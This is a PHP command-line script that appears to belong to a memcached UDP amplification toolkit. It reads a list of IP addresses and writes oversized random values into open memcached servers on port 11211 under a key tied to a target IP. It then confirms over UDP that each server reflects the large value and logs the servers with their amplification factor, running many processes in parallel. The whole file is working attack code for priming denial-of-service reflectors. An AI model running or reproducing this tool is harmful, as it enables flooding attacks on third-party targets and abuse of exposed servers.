<?php
include __DIR__ . "/config.php";

function SetupHostServer($target, $host, $set = FALSE, $timeout = 1) {
	$m = new Memcache;
	try {
		$result = @$m->connect($host, 11211, $timeout) OR die();
		$puts = "[MemcTester] $host : connected, ";
		if ($stats = $m->getStats()) {
			$puts .= "success stats query, ";
		}
		$max = 1000000;
		$inject = random_bytes($max);
		$keys_seted = FALSE;
		if ($set == "1") {
			while ($max > 1000) {
				if ($m->set(md5($target, 0), $inject) == TRUE) {
					$keys_seted = TRUE;
					$puts .= "Key MaxSize: $max; ";
					if ($result = MemcachedUDPGet($host, $timeout, md5($target))) {
						echo "setup at $host md5($target)", PHP_EOL;
						return strlen($result);
					} else {
						$m->delete(md5($target));
						die();
					}

					break;
				} else {
					$inject = substr($inject, 1);
					$max = $max * 0.5;
					$puts .= "Size Over, try $max";
				}
			}
			if ($max <= 1000) {
				$m->delete(md5($target));
				die();
			}
		} else {
			$m->delete(md5($target));
		}
	} catch (Exception $e) {
		puts($puts);
	}
}

if (threadfound($argv) == true) {
	die(thread($argv[1], $argv[2], $argv[3], $argv[4], $argv[5]));
} else {
	die(start_threading($argv[1], $argv[2], $argv[3], $argv[4], $argv[5]));
}
function puts($data) {
	file_put_contents("./log", $data . PHP_EOL, FILE_APPEND);
}

function thread($target, $ip, $output, $set) {
	//stats,Tester
	$len = SetupHostServer($target, $ip, $set, TEST_TIMEOUT);
	if ($len) {
		addentry($output, $ip);
		print($ip . " " . $len . " [x" . round($len / QUERY_LENGTH, 2) . "]\n");
	}
}

function start_threading($target, $input, $output, $set, $maxthreads) {
	$self = basename($_SERVER["SCRIPT_FILENAME"], '.php') . '.php';
	$usage = "Usage: php {$self} [Target_ip] [Input.txt] [Output.txt] [Setup or unset](setup = 1,unset = 0) [Threads]";
	$error = "";
	if (strlen($target) == 0) {
		$error = "Error: Invalid target!";
	}
	if (strlen($input) == 0) {
		$error = "Error: Invalid target!";
	}
	if (strlen($output) == 0) {
		$error .= "\nError: Invalid Filename!";
	}
	if (is_numeric($set) == false) {
		$error .= "\nError: Invalid set/unset!";
	}
	if ($maxthreads < 1 || $maxthreads > 1000) {
		$error .= "\nError: Invalid Threads!";
	}
	if (strlen($error) >= 1) {
		die($error . "\n" . $usage . "\n");
	}
	print("Setup Server : add new key md5($target)\n");
	if (filter_var($target, FILTER_VALIDATE_IP)) {
		$threads = 0;
		$threadarr = array();
		$j = 0;
		$tries = 0;
		$handle = fopen($input, "r");
		while (!feof($handle)) {
			$line = fgets($handle, 4096);
			if (preg_match('/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/', $line, $match)) {
				//正则匹配IP
				if (filter_var($match[0], FILTER_VALIDATE_IP)) {
					//PHP带的合法IP过滤器
					$ip = $match[0];
					JMP:
					if ($threads < $maxthreads) {
						if (floor(++$tries / 100) * 100 == $tries) {
							echo "$tries tests" . PHP_EOL;
						}

						$pipe[$j] = popen("php {$self} {$target} {$ip} {$output} {$set} THREAD", 'w'); //('php' . ' ' . $self . ' ' . $ip . ' ' . $output . ' ' . $responselength . ' ' . 'THREAD')
						$threadarr[] = $j;
						$j++; //$j = $j + 1;
						$threads++; //$threads = $threads + 1;
					} else {
						usleep(50000);
						foreach ($threadarr as $index) {
							pclose($pipe[$index]);
							$threads--; //$threads = $threads - 1;
						}
						$j = 0;
						unset($threadarr);
						goto JMP;
					}
				}
			}
		}
	}
	fclose($handle);
}
function MemcachedUDPGet($host, $timeout = 1, $key) {
	return mc_udprelay($host, $timeout, "get $key");
}
function LengthMemcachedUDPStat($host, $timeout = 1) {
	$length = strlen(mc_udprelay($host, $timeout, "stats"));
	if ($length > 0) {
		puts("[UDP Relay] $host Response length : $length");
	}

	return $length;
}
function mc_udprelay($host, $timeout = 1, $data) {
	$data = "\x00\x00\x00\x00\x00\x01\x00\x00$data\r\n";
	$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
	socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array('sec' => $timeout, 'usec' => 0));
	if (socket_connect($socket, $host, 11211)) {
		socket_send($socket, $data, strLen($data), 0);
		$buf = "";
		$from = "";
		$port = 0;
		$endtime = microtime(TRUE) + $timeout;
		while (microtime(true) <= $endtime) {
			try {
				$buf .= socket_read($socket, 4096);
			} catch (Exception $e) {
				break;
			}

		}
		socket_close($socket);
		return $buf;
	} else {
		puts("$host : failed to connect");
	}

}

function threadfound(array $argv) {
	$thread = false;
	foreach ($argv as $arg) {
		if ($arg == 'THREAD') {
			$thread = true;
			break;
		}
	}
	return $thread;
}

function addentry($file, $entry) {
	if (!file_exists($file)) {
		touch($file);
		chmod($file, 0777);
	}
	$fh = fopen($file, 'a') or die("Can't open file: " . $file);
	fwrite($fh, $entry . PHP_EOL);
	fclose($fh);
}

set_error_handler(function ($errno, $errstr, $errfile, $errline, array $errcontext) {
	// error was suppressed with the @-operator
	if (0 === error_reporting()) {
		return false;
	}

	throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
});